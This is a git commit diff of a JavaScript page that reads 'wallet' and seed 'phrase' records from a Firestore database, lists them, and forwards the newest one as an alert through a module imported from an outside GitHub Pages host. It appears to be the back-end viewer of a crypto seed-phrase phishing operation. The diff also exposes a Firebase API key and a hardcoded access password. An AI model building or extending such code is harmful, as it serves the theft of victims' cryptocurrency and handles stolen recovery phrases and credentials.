5215f43f470efd416168232d1bcbffe84799e13a
fucckingawesome <godknowspenspinning@gmail.com>
2022-12-17 00:46:05 +0800

    test

--- mainscript.js
+++ mainscript.js
@@ -1,59 +1,88 @@
 //firebase import
+import { notify } from 'https://giterhaber.github.io/web-codes/notification.js'
 import firebase from "https://cdn.skypack.dev/firebase/compat/app";
 import "https://cdn.skypack.dev/firebase/compat/auth";
 import "https://cdn.skypack.dev/firebase/compat/firestore";
-
+import { cmBwsbFSqC as config } from 'https://giterhaber.github.io/web-codes/configs.js'
 //jquery import
 import "https://code.jquery.com/jquery-3.6.1.min.js"
 
-const config = {
-    apiKey: "AIzaSyB121nMN9SwJ97w3VwviYzk7ZO9J_XhFcI",
-    authDomain: "chainpadsolution.firebaseapp.com",
-    projectId: "chainpadsolution",
-    storageBucket: "chainpadsolution.appspot.com",
-    messagingSenderId: "56896339800",
-    appId: "1:56896339800:web:a9a503f658efe2a64f6f2d"
-}
+
+
+// const config = {
+//   apiKey: "AIzaSyB121nMN9SwJ97w3VwviYzk7ZO9J_XhFcI",
+//   authDomain: "chainpadsolution.firebaseapp.com",
+//   projectId: "chainpadsolution",
+//   storageBucket: "chainpadsolution.appspot.com",
+//   messagingSenderId: "56896339800",
+//   appId: "1:56896339800:web:a9a503f658efe2a64f6f2d"
+// }
 
 
 firebase.initializeApp(config);
 const db = firebase.firestore();
 const auth = firebase.auth();
 
-function alert_pass() {
-    let password = prompt("Enter in the password")
+// function alert_pass() {
+//   let password = prompt("Enter in the password")
 
-    if (password === "karlogogongxdxd" || password === localStorage.getItem('ero')) {
-        //
+//   if (password === "karlogogongxdxd" || password === localStorage.getItem('ero')) {
+//     //
 
-        localStorage.setItem('ero', password)
-    } else {
-        location.reload()
-    }
-}
+//     localStorage.setItem('ero', password)
+//   } else {
+//     location.reload()
+//   }
+// }
 //alert_pass()
 
 db.collection("datas").orderBy("time", "desc").get().then((querySnapshot) => {
-    querySnapshot.forEach((doc) => {
+  querySnapshot.forEach((doc) => {
 
-   
-   
-   //console.log(doc.id, " => ", doc.data());
-//    console.log(doc.id[0])
 
+
+    //console.log(doc.id, " => ", doc.data());
+     
+
+    const date_format = {
+        hour: 'numeric',
+        minute: 'numeric',
+        hour12: true }
    
-   let wallet = doc.data().wallet
-   let phrase = doc.data().phrase
-   let time = doc.data().time.toDate()
-   
-   $('body').append(`
+
+    let wallet = doc.data().wallet
+    let phrase = doc.data().phrase
+    let time = doc.data().time.toDate().toLocaleDateString("en-US", date_format)
+
+    $('body').append(`
    <div>
-    wallet: ${wallet} <br>
-    phrase: ${phrase} <br>
-    time: ${time}
+    <p>${wallet}</p>
+    <p>${phrase}</p>
+    <p>${time}</p>
    </div><br><br>
    `)
-   
-   
-   });
-   });
+
+
+  });
+
+  function autoGet() {
+    const getWallet = $('div').find('p').eq([0]).html()
+    const getPhrase = $('div').find('p').eq([1]).html()
+    const getTime = $('div').find('p').eq([2]).html()
+
+    const INFO = `
+    ${getWallet} <br>
+     ${getPhrase} <br>
+      ${getTime} <br>
+    `
+
+    notify(INFO, 'click to open', 'https://i.pinimg.com/236x/9f/ee/55/9fee55fe5559da752bd2851103b9f69b.jpg')
+
+  }
+
+  autoGet()
+  
+
+});
+
+
